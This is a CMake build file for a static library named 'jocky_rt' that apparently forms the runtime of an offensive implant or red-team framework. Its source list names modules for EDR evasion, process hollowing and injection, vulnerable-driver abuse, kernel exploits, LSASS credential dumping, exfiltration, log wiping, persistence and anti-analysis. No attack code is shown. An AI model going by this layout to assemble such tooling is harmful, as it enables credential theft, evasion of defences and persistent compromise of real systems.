cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 14)

# ============================================================================
# HEADER DETECTION & BACKEND SELECTION
# ============================================================================
include(CheckIncludeFile)
include(CheckIncludeFileCXX)

# Detect optional cryptography libraries
check_include_file(openssl/ssl.h HAVE_OPENSSL)
check_include_file(openssl/evp.h HAVE_OPENSSL_EVP)

# Detect optional compression libraries
check_include_file(zlib.h HAVE_ZLIB)

# Detect optional Windows-specific headers
if(WIN32)
    check_include_file(wevtapi.h HAVE_WEVTAPI)
    check_include_file(winternl.h HAVE_WINTERNL)
    check_include_file(psapi.h HAVE_PSAPI)
    check_include_file(winsock2.h HAVE_WINSOCK)
endif()

# Detect optional Linux-specific headers
if(UNIX AND NOT APPLE)
    check_include_file(sys/resource.h HAVE_SYS_RESOURCE)
endif()

# ============================================================================
# BACKEND SELECTION LOGIC
# ============================================================================

# Crypto backend selection
if(HAVE_OPENSSL AND HAVE_OPENSSL_EVP)
    set(CRYPTO_BACKEND "openssl_impl")
else()
    set(CRYPTO_BACKEND "portable_impl")
endif()

# Compression backend selection
if(HAVE_ZLIB)
    set(COMPRESS_BACKEND "zlib_impl")
else()
    set(COMPRESS_BACKEND "portable_impl")
endif()

# Logging backend selection
if(WIN32 AND HAVE_WEVTAPI)
    set(LOGGING_BACKEND "windows_impl")
elseif(UNIX AND NOT APPLE)
    set(LOGGING_BACKEND "linux_impl")
else()
    set(LOGGING_BACKEND "portable_impl")
endif()

# Network backend selection
if(HAVE_OPENSSL)
    set(NETWORK_BACKEND "openssl_impl")
else()
    set(NETWORK_BACKEND "portable_impl")
endif()

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    util/strings.c
    util/process.c
    windows/evasion/unhook.c
    windows/evasion/syscalls.c
    windows/evasion/stack_spoof.c
    windows/evasion/trusted_spoof.c
    windows/evasion/edrhoker.c
    windows/evasion/advanced_edr.c
    windows/evasion/edr_throttle_profiler.c
    windows/execution/hollow.c
    windows/execution/inmem.c
    windows/execution/byovd.c
    windows/execution/btr.c
    windows/execution/driver_interact.c
    windows/exploitation/kernel_exploit.c
    exploitation/linux_kernel.c
    exfil/exfil.c
    exfil/lsass_dump.c
    windows/anti_forensics/self_delete.c
    windows/anti_forensics/logs.c
    windows/anti_forensics/forensics.c
    pack/stub_loader.c
    io/io.c
    memory/vmem.c
    windows/registry/registry.c
    windows/windows_api_impl.c
    windows/network/http.c
    windows/windows_utils.c
    windows/apis/complete_apis.c
    windows/security/token_manipulation.c
    windows/execution/process_injection.c
    windows/evasion/blindside.c
    windows/threading/threadpool_windows.c
    windows/audit/audit.c
    windows/exfil/enhanced_exfiltration.c
    windows/kernel/patchguard_peekaboo.c
    windows/security/byoud.c
    windows/anti_forensics/cache_cleanup.c
    win_wrapper.c
    byovd/driver_scoring.c
    byovd/byovd_manifest.c
    byovd/byovd_modular.c

    # Encoding utilities
    common/encoding.c

    # Compression - FFI bindings with real zlib compression
    compression/compression.c

    # Cross-platform crypto (AES/RSA/ECDH via OpenSSL)
    crypto/crypto.c

    # Cross-platform socket/network API
    network/network.c

    # Cross-platform system info
    sysinfo.c

    # CDN exfiltration (curl-based, cross-platform)
    exfil/cdn.c

    # Custom VM interpreter
    vm/vm_interpreter.c

    # Core APIs
    core/sandbox.c
    core/plugin.c

    # Conditional backend implementations
    backends/crypto/${CRYPTO_BACKEND}.c
    backends/compress/${COMPRESS_BACKEND}.c
    backends/logging/${LOGGING_BACKEND}.c
    backends/network/${NETWORK_BACKEND}.c

    # Obfuscation
    obfuscation.c

    # Forensic analysis APIs
    forensics/forensic_api_impl.c
    forensics/forensic_engine.c
    forensics/forensics_rt.c
    forensics/forensic_utils.c

    # Forensic plugins - collectors
    forensics/plugins/collectors/process_collector.c
    forensics/plugins/collectors/file_collector.c
    forensics/plugins/collectors/network_collector.c
    forensics/plugins/collectors/registry_collector.c
    forensics/plugins/collectors/memory_collector.c
    forensics/plugins/collectors/evtx_collector.c
    forensics/plugins/collectors/prefetch_collector.c
    forensics/plugins/collectors/mft_collector.c
    forensics/plugins/collectors/usnjrnl_collector.c

    # Forensic plugins - parsers
    forensics/plugins/parsers/registry_parser.c
    forensics/plugins/parsers/evtx_parser.c
    forensics/plugins/parsers/prefetch_parser.c
    forensics/plugins/parsers/mft_parser.c
    forensics/plugins/parsers/network_parser.c
    forensics/plugins/parsers/process_parser.c
    forensics/plugins/parsers/file_parser.c
    forensics/plugins/parsers/dns_parser.c
    forensics/plugins/parsers/arp_parser.c
    forensics/plugins/parsers/memory_parser.c
    forensics/plugins/parsers/elf_parser.c
    forensics/plugins/parsers/pe_parser.c

    # Forensic plugins - output
    forensics/plugins/output/json_output.c
    forensics/plugins/output/stix_output.c
    forensics/plugins/output/sigma_output.c
    forensics/plugins/output/html_output.c
    forensics/plugins/output/siem_forwarder.c

    # Linux syscall wrappers (FIXED PATHS: linux/syscalls/ not linux/)
    linux/syscalls/syscall.c
    linux/syscalls/sysinfo_syscall.c
    linux/syscalls/env_syscall.c
    linux/syscalls/file_syscall.c
    linux/syscalls/dir_syscall.c
    linux/syscalls/mem_syscall.c
    linux/syscalls/signal_syscall.c
    linux/syscalls/ipc_syscall.c
    linux/syscalls/util_syscall.c

    # Linux process operations
    linux/process/process_syscall.c
    linux/process/process_control_syscall.c
    linux/process/hollow.c
    linux/process/process_hollow.c
    linux/process/advanced_process_ops.c
    linux/process/ptrace_control.c
    linux/process/thread_hijack.c

    # Linux kernel operations
    linux/kernel/lkm_loader.c
    linux/kernel/ebpf_loader.c
    linux/kernel/modules.c
    linux/kernel/advanced_syscalls.c
    linux/kernel/advanced_kernel_ops.c
    linux/kernel/module_loader.c
    linux/kernel/module_ops.c
    linux/kernel/kread_kwrite.c
    linux/kernel/byovd_ops.c
    # TODO: linux/kernel/lkm_loader.cpp - C++ wrapper requires lkm_loader.h header fixes
    # TODO: linux/kernel/ebpf_evasion.cpp - C++ wrapper requires linux/kallsyms.h (kernel headers)
    # TODO: linux/kernel/ftrace_helper.c - requires linux/ftrace.h and linux/kprobes.h (kernel dev headers)
    # TODO: linux/kernel/ftrace_hooking.cpp - C++ wrapper requires kernel headers and lkm_loader.h

    # Linux anti-analysis
    linux/anti_analysis/anti_analysis.c
    linux/anti_analysis/detection.c
    # TODO: linux/anti_analysis/artifact_hiding.cpp - C++ wrapper requires artifact_hiding.h fixes
    # TODO: linux/anti_analysis/userland_evasion.cpp - C++ wrapper requires userland_evasion.h fixes

    # Linux privilege escalation
    linux/lpe/fence2pwn.c
    # TODO: linux/lpe/privilege_escalation.cpp - C++ wrapper integration pending

    # Linux core operations
    linux/core/audit_ops.c
    linux/core/runtime_init.c
    linux/core/sandbox_ops.c

    # Linux persistence
    linux/persistence.c
    linux/persistence/cron_systemd.c

    # Linux exfiltration
    linux/exfil/exfil_channels.c

    # Linux I/O
    linux/io/io_core.c

    # Linux threading
    linux/threading/threadpool.c

    # Linux networking
    linux/networking/network.c

    # Linux forensics
    linux/forensics/linux_forensics.c
    linux/forensics/cleanup.c

    # Linux-side FFI bindings and cross-platform wrappers
    linux/linux_utils.c

    # Forensic analysis pipeline (Kamimi)
    # TODO: forensics/* - not yet integrated. Integration path:
    #       1. Reorganize headers: move forensic_types.h, analysis.h, provenance.h to forensics/ root
    #       2. Update all #include "forensic_types.h" to relative paths (../forensic_types.h)
    #       3. Verify all plugin headers exist and paths are correct
    #       4. Add optional(SQLite3) for evidence_store.c database support
    #       5. After headers fixed: uncomment below lines
    # forensics/forensic_engine.c
    # forensics/forensics_rt.c
    # forensics/forensic_utils.c
    # forensics/jocky_forensics_rt_v2.c
    # forensics/audit/audit_log.c
    # forensics/control/capabilities.c
    # forensics/engine/analysis.c
    # forensics/engine/provenance.c
    # forensics/plugins/collectors/evtx_collector.c
    # forensics/plugins/collectors/file_collector.c
    # forensics/plugins/collectors/memory_collector.c
    # forensics/plugins/collectors/mft_collector.c
    # forensics/plugins/collectors/network_collector.c
    # forensics/plugins/collectors/prefetch_collector.c
    # forensics/plugins/collectors/process_collector.c
    # forensics/plugins/collectors/registry_collector.c
    # forensics/plugins/collectors/usnjrnl_collector.c
    # forensics/plugins/output/html_output.c
    # forensics/plugins/output/json_output.c
    # forensics/plugins/output/siem_forwarder.c
    # forensics/plugins/output/sigma_output.c
    # forensics/plugins/output/stix_output.c
    # forensics/plugins/parsers/arp_parser.c
    # forensics/plugins/parsers/dns_parser.c
    # forensics/plugins/parsers/elf_parser.c
    # forensics/plugins/parsers/evtx_parser.c
    # forensics/plugins/parsers/file_parser.c
    # forensics/plugins/parsers/memory_parser.c
    # forensics/plugins/parsers/mft_parser.c
    # forensics/plugins/parsers/network_parser.c
    # forensics/plugins/parsers/prefetch_parser.c
    # forensics/plugins/parsers/process_parser.c
    # forensics/plugins/parsers/registry_parser.c
    # forensics/store/evidence_store.c

    # AI
    ai/mutation_engine.c
)

# Platform-specific filtering
if(UNIX OR NOT WIN32)
    # Remove Windows-only sources on Linux/Unix
    message(STATUS "Removing Windows-only sources for Linux/Unix build")
    list(REMOVE_ITEM RUNTIME_SOURCES
        windows/evasion/unhook.c
        windows/evasion/syscalls.c
        windows/evasion/stack_spoof.c
        windows/evasion/trusted_spoof.c
        windows/evasion/edrhoker.c
        windows/evasion/advanced_edr.c
        windows/evasion/edr_throttle_profiler.c
        windows/execution/hollow.c
        windows/execution/inmem.c
        windows/execution/byovd.c
        windows/execution/btr.c
        windows/execution/driver_interact.c
        windows/exploitation/kernel_exploit.c
        exfil/exfil.c
        exfil/lsass_dump.c
        windows/anti_forensics/self_delete.c
        windows/anti_forensics/logs.c
        windows/anti_forensics/forensics.c
        windows/windows_api_impl.c
        pack/stub_loader.c
        windows/registry/registry.c
        windows/network/http.c
        windows/windows_utils.c
        windows/apis/complete_apis.c
        windows/security/token_manipulation.c
        windows/execution/process_injection.c
        windows/evasion/blindside.c
        windows/threading/threadpool_windows.c
        windows/exfil/enhanced_exfiltration.c
        windows/kernel/patchguard_peekaboo.c
        windows/security/byoud.c
        windows/anti_forensics/cache_cleanup.c
        win_wrapper.c
        byovd/driver_scoring.c
        byovd/byovd_manifest.c
        byovd/byovd_modular.c
        sysinfo.c
        exploitation/linux_kernel.c
        network/network.c
        linux/persistence.c
        linux/anti_analysis/detection.c
    )
elseif(WIN32)
    # Remove Linux-only sources on Windows
    message(STATUS "Removing Linux-only sources for Windows build")
    list(REMOVE_ITEM RUNTIME_SOURCES
        exploitation/linux_kernel.c
        linux/syscalls/syscall.c
        linux/syscalls/sysinfo_syscall.c
        linux/syscalls/env_syscall.c
        linux/syscalls/file_syscall.c
        linux/syscalls/dir_syscall.c
        linux/syscalls/mem_syscall.c
        linux/syscalls/signal_syscall.c
        linux/syscalls/ipc_syscall.c
        linux/syscalls/util_syscall.c
        linux/process/process_syscall.c
        linux/process/process_control_syscall.c
        linux/process/hollow.c
        linux/process/process_hollow.c
        linux/process/advanced_process_ops.c
        linux/process/ptrace_control.c
        linux/process/thread_hijack.c
        linux/kernel/lkm_loader.c
        linux/kernel/ebpf_loader.c
        linux/kernel/modules.c
        linux/kernel/advanced_syscalls.c
        linux/kernel/advanced_kernel_ops.c
        linux/kernel/module_loader.c
        linux/kernel/module_ops.c
        linux/kernel/kread_kwrite.c
        linux/kernel/byovd_ops.c
        linux/anti_analysis/anti_analysis.c
        linux/anti_analysis/detection.c
        linux/lpe/fence2pwn.c
        linux/core/audit_ops.c
        linux/core/runtime_init.c
        linux/core/sandbox_ops.c
        linux/persistence.c
        linux/persistence/cron_systemd.c
        linux/exfil/exfil_channels.c
        linux/io/io_core.c
        linux/threading/threadpool.c
        linux/networking/network.c
        linux/forensics/linux_forensics.c
        linux/forensics/cleanup.c
        linux/linux_utils.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)
target_include_directories(jocky_rt PUBLIC ${CMAKE_SOURCE_DIR}/../../include)

# ============================================================================
# CONDITIONAL LIBRARY LINKING
# ============================================================================

# Link OpenSSL if detected
if(HAVE_OPENSSL)
    find_package(OpenSSL QUIET)
    if(OPENSSL_FOUND)
        target_link_libraries(jocky_rt PUBLIC OpenSSL::Crypto)
    endif()
endif()

# Link zlib if detected
if(HAVE_ZLIB)
    find_package(ZLIB QUIET)
    if(ZLIB_FOUND)
        target_link_libraries(jocky_rt PUBLIC ZLIB::ZLIB)
    endif()
endif()

# Platform-specific libraries
if(WIN32)
    # Core Windows libraries
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi)

    # Windows Event Log if detected
    if(HAVE_WEVTAPI)
        target_link_libraries(jocky_rt PUBLIC wevtapi)
    endif()

    # Windows socket if detected
    if(HAVE_WINSOCK)
        target_link_libraries(jocky_rt PUBLIC ws2_32)
    endif()

    # Other Windows libraries
    target_link_libraries(jocky_rt PUBLIC kernel32 advapi32)
else()
    # POSIX/Linux libraries
    target_link_libraries(jocky_rt PUBLIC dl m)

    # Optional resource limit support on Linux
    if(HAVE_SYS_RESOURCE)
        # prlimit support available at compile time
    endif()
endif()

# ============================================================================
# BUILD CONFIGURATION SUMMARY
# ============================================================================

message(STATUS "=== JOCKY Runtime Configuration ===")
message(STATUS "Platform: ${CMAKE_SYSTEM_NAME}")
message(STATUS "C Standard: ${CMAKE_C_STANDARD}")
message(STATUS "CXX Standard: ${CMAKE_CXX_STANDARD}")
message(STATUS "")
message(STATUS "Backend Selection:")
message(STATUS "  Crypto backend: ${CRYPTO_BACKEND}")
message(STATUS "  Compress backend: ${COMPRESS_BACKEND}")
message(STATUS "  Logging backend: ${LOGGING_BACKEND}")
message(STATUS "  Network backend: ${NETWORK_BACKEND}")
message(STATUS "")
message(STATUS "Header Detection:")
message(STATUS "  OpenSSL (crypto + EVP): ${HAVE_OPENSSL} + ${HAVE_OPENSSL_EVP}")
message(STATUS "  zlib (compression): ${HAVE_ZLIB}")
if(WIN32)
    message(STATUS "  Windows Event Log (wevtapi.h): ${HAVE_WEVTAPI}")
    message(STATUS "  Windows internals (winternl.h): ${HAVE_WINTERNL}")
    message(STATUS "  Windows Process API (psapi.h): ${HAVE_PSAPI}")
    message(STATUS "  Windows sockets (winsock2.h): ${HAVE_WINSOCK}")
endif()
if(UNIX AND NOT APPLE)
    message(STATUS "  System resource limits (sys/resource.h): ${HAVE_SYS_RESOURCE}")
endif()
message(STATUS "=====================================")

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
